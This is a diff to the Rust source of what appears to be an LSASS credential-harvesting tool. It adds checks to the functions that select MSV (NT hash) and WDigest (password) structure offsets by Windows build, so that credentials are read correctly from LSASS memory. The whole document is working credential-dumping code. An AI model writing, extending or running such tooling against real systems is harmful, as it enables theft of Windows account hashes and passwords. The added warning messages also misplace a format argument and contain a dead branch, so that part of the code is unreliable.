@@ -745,6 +745,63 @@ fn get_msv_offsets(build: u32) -> Option<(MsvOffsets, u32)> {
 
     let (matched_build, matched_offsets) = best?;
 
+    // ── Cross-family boundary check ──────────────────────────────────
+    // If the build falls between two table entries that belong to
+    // *different* offset families, the lower entry's offsets may not
+    // apply.  For example, build 20500 sits between 20348 (family A:
+    // user=0x38, domain=0x48) and 22000 (family B: user=0x40,
+    // domain=0x50).  Using family A offsets for a build that actually
+    // belongs to family B would read garbage from LSASS memory.
+    //
+    // When the nearest-higher entry has different offsets, we reject the
+    // heuristic match unless the gap is small AND there is a same-family
+    // entry extending beyond the matched build (which means the boundary
+    // is confirmed to be further out).
+    {
+        let higher: Option<(u32, MsvOffsets)> = MSV_OFFSET_TABLE
+            .iter()
+            .filter(|(b, _)| *b > build)
+            .min_by_key(|(b, _)| *b)
+            .copied();
+
+        if let Some((higher_build, higher_offsets)) = higher {
+            let same_family = higher_offsets.primary_cred_offset
+                == matched_offsets.primary_cred_offset
+                && higher_offsets.nt_hash_offset == matched_offsets.nt_hash_offset
+                && higher_offsets.username_offset == matched_offsets.username_offset
+                && higher_offsets.domain_offset == matched_offsets.domain_offset;
+
+            if !same_family {
+                // The build sits on a family boundary.  Reject unless
+                // there is a confirmed same-family entry beyond the
+                // matched build that bridges the gap.
+                let family_extends = MSV_OFFSET_TABLE.iter().any(|&(b, offsets)| {
+                    b > matched_build
+                        && offsets.primary_cred_offset == matched_offsets.primary_cred_offset
+                        && offsets.nt_hash_offset == matched_offsets.nt_hash_offset
+                        && offsets.username_offset == matched_offsets.username_offset
+                        && offsets.domain_offset == matched_offsets.domain_offset
+                });
+                if !family_extends {
+                    tracing::warn!(
+                        "lsass_harvest: MSV build {} sits on offset family boundary \
+                         ({} → {} next higher {} has different offsets); \
+                         rejecting heuristic match for safety",
+                        build,
+                        matched_build,
+                        if family_extends {
+                            " family extends"
+                        } else {
+                            ""
+                        },
+                        higher_build,
+                    );
+                    return None;
+                }
+            }
+        }
+    }
+
     // Gap check: reject if the gap exceeds the threshold.
     let gap = build - matched_build;
     if gap > MSV_MAX_BUILD_GAP {
@@ -770,6 +827,13 @@ fn get_msv_offsets(build: u32) -> Option<(MsvOffsets, u32)> {
             return None;
         }
     }
+
+    tracing::info!(
+        "lsass_harvest: MSV using heuristic match build {} for actual build {} (gap={})",
+        matched_build,
+        build,
+        build - matched_build,
+    );
 
     Some((matched_offsets, matched_build))
 }
@@ -799,6 +863,48 @@ fn get_wdigest_offsets(build: u32) -> Option<(WdigestOffsets, u32)> {
 
     let (matched_build, matched_offsets) = best?;
 
+    // ── Cross-family boundary check ──────────────────────────────────
+    // Same logic as MSV: reject if the build sits between two different
+    // offset families without a confirmed family extension.
+    {
+        let higher: Option<(u32, WdigestOffsets)> = WDIGEST_OFFSET_TABLE
+            .iter()
+            .filter(|(b, _)| *b > build)
+            .min_by_key(|(b, _)| *b)
+            .copied();
+
+        if let Some((higher_build, higher_offsets)) = higher {
+            let same_family = higher_offsets.password_offset == matched_offsets.password_offset
+                && higher_offsets.username_offset == matched_offsets.username_offset
+                && higher_offsets.domain_offset == matched_offsets.domain_offset;
+
+            if !same_family {
+                let family_extends = WDIGEST_OFFSET_TABLE.iter().any(|&(b, offsets)| {
+                    b > matched_build
+                        && offsets.password_offset == matched_offsets.password_offset
+                        && offsets.username_offset == matched_offsets.username_offset
+                        && offsets.domain_offset == matched_offsets.domain_offset
+                });
+                if !family_extends {
+                    tracing::warn!(
+                        "lsass_harvest: WDigest build {} sits on offset family boundary \
+                         ({} → {} next higher {} has different offsets); \
+                         rejecting heuristic match for safety",
+                        build,
+                        matched_build,
+                        if family_extends {
+                            " family extends"
+                        } else {
+                            ""
+                        },
+                        higher_build,
+                    );
+                    return None;
+                }
+            }
+        }
+    }
+
     // Gap check with family-extends exemption.
     let gap = build - matched_build;
     if gap > WDIGEST_MAX_BUILD_GAP {
@@ -819,6 +925,13 @@ fn get_wdigest_offsets(build: u32) -> Option<(WdigestOffsets, u32)> {
             return None;
         }
     }
+
+    tracing::info!(
+        "lsass_harvest: WDigest using heuristic match build {} for actual build {} (gap={})",
+        matched_build,
+        build,
+        build - matched_build,
+    );
 
     Some((matched_offsets, matched_build))
 }
